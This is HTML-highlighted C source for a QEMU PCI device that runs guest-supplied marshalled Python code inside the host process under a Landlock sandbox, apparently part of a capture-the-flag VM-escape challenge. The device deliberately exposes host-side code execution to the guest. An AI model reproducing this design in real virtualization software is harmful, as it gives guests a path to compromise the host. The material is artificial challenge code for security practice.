    <span class="n">PyObject</span> <span class="o">*</span><span class="n">code_obj</span> <span class="o">=</span> <span class="n">PyMarshal_ReadObjectFromString</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">code</span><span class="p">,</span> <span class="n">code_len</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">code_obj</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">PyErr_Print</span><span class="p">();</span>
        <span class="n">PyGILState_Release</span><span class="p">(</span><span class="n">gil</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PyCode_Check</span><span class="p">(</span><span class="n">code_obj</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] marshal output not a code object</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">code_obj</span><span class="p">);</span>
        <span class="n">PyGILState_Release</span><span class="p">(</span><span class="n">gil</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">PyObject</span> <span class="o">*</span><span class="n">globals</span> <span class="o">=</span> <span class="n">pypu_get_globals</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">privileged</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">globals</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">PyErr_Print</span><span class="p">();</span>
        <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">code_obj</span><span class="p">);</span>
        <span class="n">PyGILState_Release</span><span class="p">(</span><span class="n">gil</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">PyObject</span> <span class="o">*</span><span class="n">result</span> <span class="o">=</span> <span class="n">PyEval_EvalCode</span><span class="p">((</span><span class="n">PyObject</span> <span class="o">*</span><span class="p">)</span><span class="n">code_obj</span><span class="p">,</span> <span class="n">globals</span><span class="p">,</span> <span class="n">globals</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] python execution failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">PyErr_Print</span><span class="p">();</span>
        <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">code_obj</span><span class="p">);</span>
        <span class="n">PyGILState_Release</span><span class="p">(</span><span class="n">gil</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] python execution succeeded</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
    <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">code_obj</span><span class="p">);</span>
    <span class="n">PyGILState_Release</span><span class="p">(</span><span class="n">gil</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">enable_landlock</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">handled</span> <span class="o">=</span>
        <span class="n">LANDLOCK_ACCESS_FS_EXECUTE</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_WRITE_FILE</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_READ_FILE</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_READ_DIR</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_REMOVE_DIR</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_REMOVE_FILE</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_MAKE_CHAR</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_MAKE_DIR</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_MAKE_REG</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_MAKE_SOCK</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_MAKE_FIFO</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_MAKE_BLOCK</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_MAKE_SYM</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_REFER</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_TRUNCATE</span> <span class="o">|</span>
        <span class="n">LANDLOCK_ACCESS_FS_IOCTL_DEV</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_NO_NEW_PRIVS</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] PR_SET_NO_NEW_PRIVS failed: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">struct</span> <span class="n">landlock_ruleset_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">handled_access_fs</span> <span class="o">=</span> <span class="n">handled</span><span class="p">,</span>
    <span class="p">};</span>

    <span class="kt">int</span> <span class="n">ruleset_fd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_landlock_create_ruleset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ruleset_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] landlock_create_ruleset failed: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">int</span> <span class="n">lib_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/usr/lib/python3.13"</span><span class="p">,</span> <span class="n">O_PATH</span> <span class="o">|</span> <span class="n">O_DIRECTORY</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">lib_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] open python stdlib failed: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="n">close</span><span class="p">(</span><span class="n">ruleset_fd</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">struct</span> <span class="n">landlock_path_beneath_attr</span> <span class="n">lib_rule</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">allowed_access</span> <span class="o">=</span>
            <span class="n">LANDLOCK_ACCESS_FS_READ_FILE</span> <span class="o">|</span>
            <span class="n">LANDLOCK_ACCESS_FS_READ_DIR</span> <span class="o">|</span>
            <span class="n">LANDLOCK_ACCESS_FS_EXECUTE</span><span class="p">,</span>
        <span class="p">.</span><span class="n">parent_fd</span> <span class="o">=</span> <span class="n">lib_fd</span><span class="p">,</span>
    <span class="p">};</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">syscall</span><span class="p">(</span><span class="n">__NR_landlock_add_rule</span><span class="p">,</span> <span class="n">ruleset_fd</span><span class="p">,</span> <span class="n">LANDLOCK_RULE_PATH_BENEATH</span><span class="p">,</span>
                <span class="o">&amp;</span><span class="n">lib_rule</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] landlock_add_rule for stdlib failed: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="n">close</span><span class="p">(</span><span class="n">lib_fd</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">ruleset_fd</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">close</span><span class="p">(</span><span class="n">lib_fd</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">syscall</span><span class="p">(</span><span class="n">__NR_landlock_restrict_self</span><span class="p">,</span> <span class="n">ruleset_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] landlock_restrict_self failed: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="n">close</span><span class="p">(</span><span class="n">ruleset_fd</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">close</span><span class="p">(</span><span class="n">ruleset_fd</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">python_worker</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PypuPCIState</span> <span class="o">*</span><span class="n">state</span> <span class="o">=</span> <span class="n">opaque</span><span class="p">;</span>

    <span class="n">Py_Initialize</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">enable_landlock</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">qemu_mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_mutex</span><span class="p">);</span>
        <span class="n">state</span><span class="o">-&gt;</span><span class="n">py_thread_alive</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
        <span class="n">state</span><span class="o">-&gt;</span><span class="n">done_gen</span> <span class="o">=</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">work_gen</span><span class="p">;</span>
        <span class="n">qemu_cond_signal</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_cond</span><span class="p">);</span>
        <span class="n">qemu_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_mutex</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">qemu_mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_mutex</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_thread_alive</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_thread_alive</span> <span class="o">&amp;&amp;</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">done_gen</span> <span class="o">==</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">work_gen</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">qemu_cond_wait</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_cond</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_mutex</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_thread_alive</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="kt">uint32_t</span> <span class="n">pyc_len</span> <span class="o">=</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">code_len</span><span class="p">;</span>
        <span class="kt">uint8_t</span> <span class="n">pyc</span><span class="p">[</span><span class="n">CODE_BUF_SIZE</span><span class="p">];</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="n">pyc</span><span class="p">,</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">code</span><span class="p">,</span> <span class="n">pyc_len</span><span class="p">);</span>
        <span class="kt">uint32_t</span> <span class="n">task_gen</span> <span class="o">=</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">work_gen</span><span class="p">;</span>
        <span class="n">qemu_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_mutex</span><span class="p">);</span>

        <span class="n">execute_python_code</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">pyc</span><span class="p">,</span> <span class="n">pyc_len</span><span class="p">);</span>

        <span class="n">qemu_mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_mutex</span><span class="p">);</span>
        <span class="n">state</span><span class="o">-&gt;</span><span class="n">done_gen</span> <span class="o">=</span> <span class="n">task_gen</span><span class="p">;</span>
        <span class="n">qemu_cond_signal</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_cond</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">qemu_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_mutex</span><span class="p">);</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">pypu_mmio_read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PypuPCIState</span> <span class="o">*</span><span class="n">state</span> <span class="o">=</span> <span class="n">opaque</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="o">&amp;&amp;</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mh">0x50595055ull</span><span class="p">;</span> <span class="cm">/* "PYPU" */</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="mh">0x04</span> <span class="o">&amp;&amp;</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">scratch</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="mh">0x08</span> <span class="o">&amp;&amp;</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">greet_count</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="mh">0x10</span> <span class="o">&amp;&amp;</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">code_len</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&gt;=</span> <span class="mh">0x100</span> <span class="o">&amp;&amp;</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x100</span> <span class="o">&lt;</span> <span class="n">CODE_BUF_SIZE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">code</span><span class="p">[</span><span class="n">addr</span> <span class="o">-</span> <span class="mh">0x100</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">pypu_stdout_read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PypuPCIState</span> <span class="o">*</span><span class="n">state</span> <span class="o">=</span> <span class="n">opaque</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stdout_capture</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stdout_capture</span><span class="p">[</span><span class="n">addr</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">pypu_stderr_read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PypuPCIState</span> <span class="o">*</span><span class="n">state</span> <span class="o">=</span> <span class="n">opaque</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stderr_capture</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stderr_capture</span><span class="p">[</span><span class="n">addr</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">pypu_mmio_write</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">,</span>
                             <span class="kt">unsigned</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PypuPCIState</span> <span class="o">*</span><span class="n">state</span> <span class="o">=</span> <span class="n">opaque</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="mh">0x04</span> <span class="o">&amp;&amp;</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">state</span><span class="o">-&gt;</span><span class="n">scratch</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="mh">0x0c</span> <span class="o">&amp;&amp;</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">state</span><span class="o">-&gt;</span><span class="n">greet_count</span><span class="o">++</span><span class="p">;</span>
        <span class="n">qemu_mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_mutex</span><span class="p">);</span>
        <span class="n">state</span><span class="o">-&gt;</span><span class="n">work_gen</span><span class="o">++</span><span class="p">;</span>
        <span class="n">qemu_cond_signal</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_cond</span><span class="p">);</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">done_gen</span> <span class="o">!=</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">work_gen</span> <span class="o">&amp;&amp;</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">py_thread_alive</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">qemu_cond_wait</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_cond</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_mutex</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">qemu_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_mutex</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="mh">0x10</span> <span class="o">&amp;&amp;</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">&gt;</span> <span class="n">CODE_BUF_SIZE</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">val</span> <span class="o">=</span> <span class="n">CODE_BUF_SIZE</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">state</span><span class="o">-&gt;</span><span class="n">code_len</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&gt;=</span> <span class="mh">0x100</span> <span class="o">&amp;&amp;</span> <span class="n">addr</span> <span class="o">&lt;</span> <span class="mh">0x100</span> <span class="o">+</span> <span class="n">CODE_BUF_SIZE</span> <span class="o">&amp;&amp;</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">state</span><span class="o">-&gt;</span><span class="n">code</span><span class="p">[</span><span class="n">addr</span> <span class="o">-</span> <span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span><span class="n">val</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="k">const</span> <span class="n">MemoryRegionOps</span> <span class="n">pypu_mmio_ops</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="n">pypu_mmio_read</span><span class="p">,</span>
    <span class="p">.</span><span class="n">write</span> <span class="o">=</span> <span class="n">pypu_mmio_write</span><span class="p">,</span>
    <span class="p">.</span><span class="n">endianness</span> <span class="o">=</span> <span class="n">DEVICE_LITTLE_ENDIAN</span><span class="p">,</span>
    <span class="p">.</span><span class="n">valid</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">min_access_size</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
        <span class="p">.</span><span class="n">max_access_size</span> <span class="o">=</span> <span class="mi">4</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="p">.</span><span class="n">impl</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">min_access_size</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
        <span class="p">.</span><span class="n">max_access_size</span> <span class="o">=</span> <span class="mi">4</span><span class="p">,</span>
    <span class="p">},</span>
<span class="p">};</span>

<span class="k">static</span> <span class="k">const</span> <span class="n">MemoryRegionOps</span> <span class="n">pypu_stdout_ops</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="n">pypu_stdout_read</span><span class="p">,</span>
    <span class="p">.</span><span class="n">endianness</span> <span class="o">=</span> <span class="n">DEVICE_LITTLE_ENDIAN</span><span class="p">,</span>
    <span class="p">.</span><span class="n">valid</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">min_access_size</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
        <span class="p">.</span><span class="n">max_access_size</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="p">.</span><span class="n">impl</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">min_access_size</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
        <span class="p">.</span><span class="n">max_access_size</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
    <span class="p">},</span>
<span class="p">};</span>

<span class="k">static</span> <span class="k">const</span> <span class="n">MemoryRegionOps</span> <span class="n">pypu_stderr_ops</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="n">pypu_stderr_read</span><span class="p">,</span>
    <span class="p">.</span><span class="n">endianness</span> <span class="o">=</span> <span class="n">DEVICE_LITTLE_ENDIAN</span><span class="p">,</span>
    <span class="p">.</span><span class="n">valid</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">min_access_size</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
        <span class="p">.</span><span class="n">max_access_size</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="p">.</span><span class="n">impl</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">min_access_size</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
        <span class="p">.</span><span class="n">max_access_size</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
    <span class="p">},</span>
<span class="p">};</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">pypu_pci_reset</span><span class="p">(</span><span class="n">DeviceState</span> <span class="o">*</span><span class="n">dev</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PypuPCIState</span> <span class="o">*</span><span class="n">state</span> <span class="o">=</span> <span class="n">PYPU_PCI</span><span class="p">(</span><span class="n">dev</span><span class="p">);</span>

    <span class="n">state</span><span class="o">-&gt;</span><span class="n">scratch</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">state</span><span class="o">-&gt;</span><span class="n">greet_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">state</span><span class="o">-&gt;</span><span class="n">code_len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">code</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">code</span><span class="p">));</span>
    <span class="n">pstrcpy</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stdout_capture</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stdout_capture</span><span class="p">),</span> <span class="s">""</span><span class="p">);</span>
    <span class="n">pstrcpy</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stderr_capture</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stderr_capture</span><span class="p">),</span> <span class="s">""</span><span class="p">);</span>
    <span class="n">pstrcpy</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">flag</span><span class="p">),</span> <span class="s">""</span><span class="p">);</span>
    <span class="n">state</span><span class="o">-&gt;</span><span class="n">work_gen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">state</span><span class="o">-&gt;</span><span class="n">done_gen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

